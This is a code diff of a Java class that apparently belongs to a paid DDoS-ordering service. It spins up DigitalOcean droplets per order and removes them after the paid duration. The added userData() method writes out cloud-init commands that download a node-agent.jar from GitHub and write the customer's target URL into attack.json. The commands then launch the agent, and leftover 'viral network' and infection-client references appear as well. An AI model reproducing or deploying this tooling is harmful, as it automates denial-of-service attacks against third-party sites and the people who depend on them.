@@ -4,8 +4,6 @@ import com.myjeeva.digitalocean.impl.DigitalOceanClient;
 import com.myjeeva.digitalocean.pojo.*;
 import com.orderddos.docean.DropletImage;
 import com.orderddos.docean.DropletSize;
-import io.github.avt.env.spreading.InfectionClient;
-import io.github.avt.env.spreading.impl.InfectionClientImpl;
 import io.vertx.core.Future;
 import io.vertx.core.Vertx;
 import org.slf4j.Logger;
@@ -18,6 +16,7 @@ import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
 import static com.orderddos.docean.DropletRegion.AMS_3;
+import static com.orderddos.server.DDoSApiService.SETUP_ENV_SCRIPT;
 
 public class DDoSDeployment {
 
@@ -28,19 +27,17 @@ public class DDoSDeployment {
     private final Order order;
 
     private static final Integer DELAY_BEFORE_DEPLOYMENT_MS = (60 * 2 + 30) * 1000;
-    private final InfectionClient infectionClient;
 
     public DDoSDeployment(DigitalOceanClient digitalOceanClient, Vertx vertx, Order order) {
         this.digitalOceanClient = digitalOceanClient;
         this.vertx = vertx;
         this.order = order;
-        this.infectionClient = new InfectionClientImpl(vertx);
     }
 
     public Future<Void> deploy() {
         Droplet droplets = droplets();
         Future<Droplets> fd = deployDroplets(droplets);
-        removeDropletsAfter(duration());
+        removeDropletsAfter(duration() + DELAY_BEFORE_DEPLOYMENT_MS);
         deployViralNetworkAfter(DELAY_BEFORE_DEPLOYMENT_MS);
         return fd.mapEmpty();
     }
@@ -53,8 +50,7 @@ public class DDoSDeployment {
                         .stream()
                         .map(droplet -> droplet.getNetworks().getVersion4Networks().get(0).getIpAddress())
                         .collect(Collectors.toSet());
-                final String firtsIp = droplestIps.iterator().next();
-//                infectionClient.infect(new HostWithEnvironment(firtsIp, 2222), new File(""));
+
             } catch (Exception e) {
                 log.error("Unable to get info about droplets: ", e);
             }
@@ -66,6 +62,7 @@ public class DDoSDeployment {
         vertx.executeBlocking(event -> {
             try {
                 Droplets createdDropltets = digitalOceanClient.createDroplets(droplets);
+                log.info("Order is deployed: " + order);
                 event.complete(createdDropltets);
             } catch (Exception e) {
                 log.error("Failed to deploy order " + order, e);
@@ -80,7 +77,9 @@ public class DDoSDeployment {
             Future<Delete> delete = Future.future();
             vertx.executeBlocking(event -> {
                 try {
-                    event.complete(digitalOceanClient.deleteDropletByTagName(order.getUuid().toString()));
+                    final Delete removeDroplets = digitalOceanClient.deleteDropletByTagName(order.getUuid().toString());
+                    log.info(String.format("Droplets  with tag '%s' has been removed", order.getUuid().toString()));
+                    event.complete(removeDroplets);
                 } catch (Exception e) {
                     log.error("Failed to delete" + order, e);
                     event.fail(e);
@@ -105,7 +104,9 @@ public class DDoSDeployment {
         droplets.setRegion(new Region(AMS_3));
         droplets.setImage(new Image(DropletImage.UBUNTU_18_04_X64));
         droplets.setTags(List.of(order.getUuid().toString()));
-        droplets.setUserData(DDoSApiService.SETUP_ENV_SCRIPT);
+        final String userData = userData();
+        droplets.setUserData(userData);
+        log.info("User data:\n" + userData);
         List<Key> keys = new ArrayList<>();
         keys.add(new Key("36:59:36:cf:aa:7f:0a:1a:e9:8f:18:b9:0b:5b:59:d2"));
         droplets.setKeys(keys);
@@ -117,5 +118,21 @@ public class DDoSDeployment {
                 order.getDuration().getMinutes() * 60 +
                 order.getDuration().getHours() * 60 * 60 +
                 order.getDuration().getDays() * 60 * 60 * 24) * 1000;
+    }
+
+    private String userData() {
+        return SETUP_ENV_SCRIPT + String.format(
+                "\n  - wget https://download.java.net/java/GA/jdk11/13/GPL/openjdk-11.0.1_linux-x64_bin.tar.gz -O /root/openjdk-11.0.1_linux-x64_bin.tar.gz\n" +
+                        "  - tar xzv -C /opt -f /root/openjdk-11.0.1_linux-x64_bin.tar.gz\n" +
+                        "  - update-alternatives --install /usr/bin/java java /opt/jdk-11.0.1/bin/java 1\n" +
+                        "  - wget https://github.com/order-ddos/order-ddos.github.io/releases/download/0.0.1/node-agent.jar -O /root/node-agent.jar\n" +
+                        "  - mkdir -p /root/node-agent\n" +
+                        "  - cd /root/node-agent\n" +
+                        "  - echo '{\"uuid\": \"%s\", \"uri\": \"%s\"}' > attack.json\n" +
+                        "  - zip -rv /root/node-agent.jar attack.json\n" +
+                        "  - java -jar /root/node-agent.jar &",
+                order.getUuid().toString(),
+                order.getTarget_url()
+        );
     }
 }
